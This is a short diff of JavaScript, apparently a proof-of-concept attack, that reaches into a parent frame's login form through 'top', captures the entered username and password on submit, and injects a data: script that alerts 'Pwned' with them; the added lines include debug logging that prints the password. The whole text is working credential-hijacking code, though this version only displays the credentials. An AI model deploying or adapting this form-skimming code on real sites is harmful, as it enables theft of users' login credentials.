@@ -11,7 +11,9 @@ top.console.log('loaded script')
   top.username.addEventListener('change', e => user = e.target.value);
   // top.password.addEventListener('change', e => user = e.target.value);
   top.document.forms[0].addEventListener('submit', () => {
+    console.log("submitting a form");
     if (top.document.forms[0].elements[0].classList.contains('hidden-input')) {
+      console.log("doing shit", top.password.value);
       pw = top.password.value;
       x = document.createElement('script');
       x.src = 'data:,alert("Pwned "+user+" "+pw)';
@@ -27,9 +29,7 @@ top.console.log('loaded script')
       })
     } else {
       console.log("not doing anything");
-      top.document.forms[0].elements[0];
+      console.log(top.document.forms[0].elements[0]);
     }
   })
 // };
-
-document.body.appendChild(f);
